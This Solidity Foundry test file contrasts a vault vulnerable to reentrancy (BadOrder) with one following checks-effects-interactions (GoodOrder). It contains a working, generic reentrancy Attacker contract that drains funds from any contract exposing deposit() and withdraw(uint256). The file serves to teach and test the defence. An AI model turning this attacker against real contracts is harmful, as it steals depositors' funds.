// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {BadOrder, GoodOrder} from "../contracts/CEI.sol";

/// Reentrancy attacker - works against any contract exposing
/// deposit() payable and withdraw(uint256).
contract Attacker {
    address payable public target;
    uint256 public stolen;
    bool internal _attacking;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() external payable {
        _attacking = true;
        (bool ok,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok, "deposit failed");
        (ok,) = target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        require(ok, "withdraw failed");
        _attacking = false;
    }

    receive() external payable {
        stolen += msg.value;
        // Re-enter as long as the target still has funds and we're inside attack()
        if (_attacking && target.balance >= msg.value) {
            (bool ok,) = target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
            ok; // intentionally ignore - GoodOrder will revert here
        }
    }
}

contract CEITest is Test {
    BadOrder public bad;
    GoodOrder public good;
    address victim = makeAddr("victim");

    function setUp() public {
        bad = new BadOrder();
        good = new GoodOrder();

        // Victim seeds each vault with 10 ETH
        vm.deal(victim, 20 ether);
        vm.startPrank(victim);
        bad.deposit{value: 10 ether}();
        good.deposit{value: 10 ether}();
        vm.stopPrank();
    }

    function test_BadOrder_IsDrainable() public {
        Attacker att = new Attacker(payable(address(bad)));
        vm.deal(address(att), 1 ether);

        att.attack{value: 1 ether}();

        // Attacker put in 1 ether but walked out with significantly more
        assertGt(att.stolen(), 1 ether);
        assertLt(address(bad).balance, 10 ether);
    }

    function test_GoodOrder_BlocksTheSameAttack() public {
        Attacker att = new Attacker(payable(address(good)));
        vm.deal(address(att), 1 ether);

        att.attack{value: 1 ether}();

        // Effects-before-interactions: the balance is already decremented when
        // the receive() hook fires, so the re-entrant withdraw fails its
        // require(balances[msg.sender] >= amount). Attacker only gets their own deposit back.
        assertEq(att.stolen(), 1 ether);
        assertEq(address(good).balance, 10 ether); // victim's funds untouched
    }
}
